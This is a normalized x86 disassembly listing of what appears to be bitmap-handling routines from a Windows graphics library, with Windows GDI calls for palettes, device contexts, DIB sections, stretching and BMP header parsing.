call EnterCriticalSection
xor eax eax
push ebp
push sub_42780c
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402b5c
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_428098
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_426c08
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_426c0c
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418bac
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_427844
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_427e28
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4278d3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_427440
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_426ddc
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_428098
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4278d8
mov eax [ ebp - 0x8 ]
call sub_423298
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403930
call sub_403984
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_427904
push ebx
mov ebx eax
mov eax ebx
call sub_427bf8
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40d130
pop ebx
retn
sub_427934
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_41ab48
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_427e28
lea eax [ ebx + 0x2c ]
call sub_40d130
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_428098
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_4279a8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_42508c
mov eax ebx
call sub_427f38
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_427d34
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_427be4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_424fb8
push eax
call SetStretchBltMode
mov eax ebx
call sub_427c78
mov dl [ r-xdata ]
call sub_42508c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_427ed8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_427c78
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427beb
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_427b79
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_4253a4
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_427c78
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_425548
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_427bf8
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_427e38
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_427844
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_4252fc
sub_427c78
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_427e38
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_426a14
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_427904
sub_427cc0
push ebx
mov ebx eax
mov eax ebx
call sub_427e28
mov eax ebx
call sub_427e38
mov edx ebx
mov eax ebx
call sub_427904
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_427ce4
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_427d64
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_423b68
mov eax ebx
call sub_427d34
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_427c78
xor edx edx
pop ecx
call sub_424f44
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_427db4
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_427f38
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_426ddc
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_427e38
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_41aae4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_427ebb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_427ed8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_427e28
mov eax ebx
call sub_427e38
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_427d64
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_4274a4
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_426998
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_427f38
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_425a94
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_426998
push 0x0
call GetDC
call sub_4253a4
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_427ff0
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_425278
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_427844
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_427e28
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402b5c
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_428074
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_41aac4
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_428728
pop esi
pop ebx
retn
sub_428098
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42811f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_403304
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_42817f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_426c0c
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_426c08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428186
push rw-data
call LeaveCriticalSection
retn
sub_428198
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_428728
pop edx
pop edi
pop esi
pop ebx
retn
sub_4281c0
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026dc
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_4286dd
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_4286b0
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402b5c
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_425290
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41ad60
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402b5c
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41acf0
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_425514
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_425534
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_41acf0
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_4253a4
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_42862b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_4257dc
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026dc
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_428593
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41acf0
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_4253a4
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_428567
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_425a94
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40cbd4
call sub_425290
jmp r-xdata
xor eax eax
push ebp
push sub_4285fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41acf0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42856e
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428632
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40cbd4
call sub_425290
jmp r-xdata
sub_42856e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026fc
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_428632
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402b5c
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4286c7
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_425a94
mov [ ebp - 0x30 ] eax
sub_4286e4
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_428098
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_428728
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_427e28
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_41acf0
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402b5c
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_428098
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_4281c0
call sub_425290
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_428798
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_427e28
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402b5c
test edi edi
je r-xdata
